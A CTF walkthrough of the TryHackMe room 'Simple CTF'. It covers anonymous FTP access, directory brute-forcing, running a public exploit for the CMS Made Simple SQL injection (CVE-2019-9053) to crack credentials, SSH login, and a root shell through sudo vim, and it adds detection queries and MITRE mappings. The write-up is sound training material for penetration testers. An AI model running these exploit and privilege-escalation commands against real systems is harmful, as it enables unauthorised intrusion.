# Simple CTF
**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** General
**Completed:** March 2026
**Author:** Jay Patel

## Room Summary

A beginner-level room that chains FTP anonymous access, web enumeration,
CMS version fingerprinting, SQL injection exploitation, and sudo abuse into
a complete attack path from zero credentials to root. Nothing is given
upfront — every piece of information is discovered through enumeration.

The room reinforces the core pentest loop: enumerate every service, match
software versions to CVEs, exploit to gain access, escalate privileges.
CMS Made Simple below version 2.2.10 has an unauthenticated SQL injection
vulnerability in its News module that dumps database credentials without
requiring a logged-in session.

---

## Attack Chain Overview

```
Nmap → FTP anonymous login → ForMitch.txt → username
Gobuster → /simple/ → CMS Made Simple 2.2.8
CVE-2019-9053 SQLi → password hash → cracked
SSH port 2222 → user flag → sudo -l → vim → root flag
```

---

## Step 1 — Initial Nmap Scan

**Goal:** Discover all open services across all ports before deciding where
to attack. Never scan default ports only — non-standard ports like 2222 are
deliberately used to avoid basic scanners.

```bash
nmap -sV -sC -p- --min-rate 5000 10.10.x.x
```

**Flag breakdown:**

| Flag | Purpose |
|---|---|
| `-sV` | Version detection — exact software and version on each port |
| `-sC` | Default NSE scripts — banner grabbing, anonymous FTP check, etc |
| `-p-` | Scan all 65535 ports — not just the default top 1000 |
| `--min-rate 5000` | Minimum packet rate — speeds up the full port scan |

**Output:**
```
kali@kali:~$ nmap -sV -sC -p- --min-rate 5000 10.10.x.x

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu0.8
```

**What each service tells you:**

| Port | Service | Key Detail | Next Action |
|---|---|---|---|
| 21 | FTP vsftpd 3.0.3 | Anonymous login allowed | Log in immediately and list all files |
| 80 | HTTP Apache 2.4.18 | Default page showing | Run gobuster for hidden directories |
| 2222 | SSH OpenSSH 7.2p2 | Non-standard port | Brute force target once a username is found |

Two services run below port 1000: FTP on 21 and HTTP on 80.
SSH is running on port 2222 — a non-standard port designed to avoid
basic scanners that only check common ports.

---

## Step 2 — FTP Anonymous Login

**Goal:** vsftpd reported anonymous login allowed in the Nmap output.
Log in and retrieve any files.

```bash
kali@kali:~$ ftp 10.10.x.x
Connected to 10.10.x.x.
220 (vsFTPd 3.0.3)
Name (10.10.x.x:kali): anonymous
Password:
230 Login successful.
```

```bash
ftp> ls
ftp> ls pub/
```

**Output:**
```
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub

ftp> cd pub
ftp> ls
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt

ftp> get ForMitch.txt
ftp> bye
```

**Read the file:**
```bash
kali@kali:~$ cat ForMitch.txt

Dammit man... you're the worst dev I've seen. You set the same
password everywhere, genius. Do something more secure.
- management
```

**What this gives you:**
The filename `ForMitch.txt` directly reveals a username — `mitch`. The
content confirms this person reuses passwords. That means whatever password
is found on one service will likely work on others. This is a classic OSINT
find — the developer's name leaking through a carelessly named file.

---

## Step 3 — Web Enumeration

**Goal:** Discover hidden directories on the web server and identify
what application is running.

```bash
kali@kali:~$ curl http://10.10.x.x/robots.txt
```

**Output:**
```
#
# "$Id: robots.txt 3681 2003-11-08 17:18:50Z mike $"
#
#  This file tells search engines not to index your site.
#
User-agent: *
Disallow: /
Disallow: /openemr-5_0_1_3
#
# End of "$Id: robots.txt 3681 2003-11-08 17:18:50Z mike $"
```

`/openemr-5_0_1_3` looks interesting but does not actually exist — it is a
red herring. Always verify paths exist before chasing them. Gobuster will
find what is actually there.

```bash
kali@kali:~$ gobuster dir \
-u http://10.10.x.x \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt
```

**Output:**
```
===============================================================
Gobuster v3.1.0
===============================================================
/index.html           (Status: 200)
/robots.txt           (Status: 200)
/simple               (Status: 301)
===============================================================
```

Navigate to `http://10.10.x.x/simple/` — this loads **CMS Made Simple**.
Scroll to the bottom of the page to find the version in the footer:
**CMS Made Simple Version 2.2.8**

---

## Step 4 — CVE-2019-9053 SQL Injection

**Goal:** CMS Made Simple 2.2.8 is vulnerable to an unauthenticated SQL
injection in the News module. Use this to extract credentials directly
from the database.

```bash
kali@kali:~$ searchsploit cms made simple 2.2
```

**Output:**
```
CMS Made Simple < 2.2.10 - SQL Injection   | php/webapps/46635.py
```

**Download the exploit:**
```bash
kali@kali:~$ searchsploit -m php/webapps/46635.py
```

**Run the exploit:**
```bash
kali@kali:~$ python2 46635.py \
-u http://10.10.x.x/simple/ \
--crack \
-w /usr/share/wordlists/rockyou.txt
```

**Output:**
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: secret
```

**What happened here:**
The exploit sends a crafted request to the News module that causes the
database to return user records — no login required. It extracts the
username, email, password hash, and salt. The `--crack` flag then runs
the hash against rockyou.txt and recovers the plaintext password.

The CVE number is **CVE-2019-9053** and the vulnerability type is
**SQL Injection**. Credentials recovered: `mitch:secret`.

---

## Step 5 — SSH Login on Port 2222

**Goal:** Use the recovered credentials to get a shell on the target.
SSH is on non-standard port 2222 — remember to specify it.

```bash
kali@kali:~$ ssh -p 2222 mitch@10.10.x.x
```

**Output:**
```
mitch@10.10.x.x's password: secret

Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

$ ls
user.txt

$ cat user.txt
G00d j0b, keep up!
```

**Login method:** SSH with password credentials.
**User flag:** `G00d j0b, keep up!`

---

## Step 6 — Enumerate for Privilege Escalation

**Goal:** Find other users on the system and check what the current user
can run with elevated privileges.

```bash
$ ls /home/
```

**Output:**
```
mitch  sunita
```

Another user `sunita` exists on the system.

```bash
$ sudo -l
```

**Output:**
```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

`sudo -l` is always the first privilege escalation check on any system.
This output shows that `mitch` can run `vim` as root with no password
required. Any binary in a `sudo -l` output with `NOPASSWD` is an instant
privilege escalation path — check GTFOBins for the exact method.

---

## Step 7 — Privilege Escalation via vim

**Goal:** Abuse the sudo vim permission to spawn a root shell.
GTFOBins documents this exact technique.

```bash
$ sudo vim -c ':!/bin/bash'
```

Alternatively inside vim:
```bash
$ sudo vim
# Then type inside vim:
:shell
```

**Output:**
```
root@Machine:~# id
uid=0(root) gid=0(root) groups=0(root)

root@Machine:~# cat /root/root.txt
W3ll d0n3. You made it!
```

`vim -c ':!/bin/bash'` passes a command to vim on startup using the `-c`
flag which executes any vim command before loading. `:!` runs a shell
command from inside vim. Since vim was launched as root via sudo, the
shell spawned inherits root privileges.

---

## What I Learned / What Surprised Me

The file naming convention was what I found most interesting here.
`ForMitch.txt` is a completely accidental but critical OSINT leak — the
developer's name sitting in a publicly accessible FTP directory gave me
a confirmed username before I had touched anything else. In real
environments this kind of careless naming happens constantly.

The robots.txt red herring was also a useful lesson. `/openemr-5_0_1_3`
looked significant but the path did not exist. Gobuster found the actual
interesting path `/simple/` which robots.txt did not mention at all.
Never trust robots.txt as your only source of directory discovery — always
run a full brute force regardless.

The `sudo -l` output giving `vim` with `NOPASSWD` is a reminder that
privilege escalation does not always require an exploit. Sometimes an
administrator misconfigures sudo and hands you root directly. GTFOBins
should be open in a tab on every engagement the moment you get a shell.

---

## Detection Layer

| Attack Stage | MITRE Technique | Log Source | Detection Signal |
|---|---|---|---|
| FTP anonymous login | T1078.001 | FTP server logs | Anonymous auth followed by file download |
| Web directory brute force | T1083 | Apache access logs | High volume 404s from single IP in short window |
| SQL injection exploit | T1190 | Web app logs | Repeated malformed GET requests to News module |
| SSH login with password | T1078 | Auth.log | SSH login from new external IP using password auth |
| sudo abuse via vim | T1548.003 | Auth.log / sudolog | sudo vim execution by non-admin user |

**SPL Query — detect anonymous FTP download:**
```spl
index=ftp_logs action=download user=anonymous
| stats count by src_ip, filename
| sort -count
```

**KQL Query (Sentinel) — detect sudo abuse:**
```kql
Syslog
| where SyslogMessage contains "sudo" and SyslogMessage contains "vim"
| summarize Count=count() by Computer, SyslogMessage
| sort by Count desc
```

**MITRE Techniques:**
- T1078.001 — Valid Accounts: Default Accounts (anonymous FTP)
- T1083 — File and Directory Discovery
- T1190 — Exploit Public-Facing Application (CVE-2019-9053)
- T1078 — Valid Accounts (SSH with recovered credentials)
- T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching

---

## Full Attack Chain Reference

```
1.  nmap -sV -sC -p- --min-rate 5000 <IP>
    → FTP(21), HTTP(80), SSH(2222)

2.  ftp <IP>
    → Anonymous login → ForMitch.txt → username: mitch

3.  gobuster dir -u http://<IP> -w common.txt
    → /simple/ → CMS Made Simple 2.2.8

4.  searchsploit cms made simple 2.2
    → CVE-2019-9053 → 46635.py

5.  python2 46635.py -u http://<IP>/simple/ --crack -w rockyou.txt
    → mitch:secret

6.  ssh -p 2222 mitch@<IP>
    → user.txt: G00d j0b, keep up!

7.  sudo -l
    → (root) NOPASSWD: /usr/bin/vim

8.  sudo vim -c ':!/bin/bash'
    → root shell → root.txt: W3ll d0n3. You made it!
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -sV -sC -p- --min-rate 5000 <IP>` | Full port scan with version detection |
| `ftp <IP>` then username `anonymous` | Anonymous FTP login |
| `ftp> ls -al` | List all files including hidden |
| `ftp> get <file>` | Download file |
| `gobuster dir -u <URL> -w <wordlist>` | Directory brute force |
| `searchsploit cms made simple 2.2` | Find exploit for CMS version |
| `searchsploit -m <path>` | Download exploit to current directory |
| `python2 46635.py -u <URL> --crack -w rockyou.txt` | Run SQLi exploit and crack hash |
| `ssh -p 2222 user@<IP>` | SSH on non-standard port |
| `sudo -l` | Check sudo permissions — always first privesc step |
| `sudo vim -c ':!/bin/bash'` | Escalate via vim GTFOBins technique |
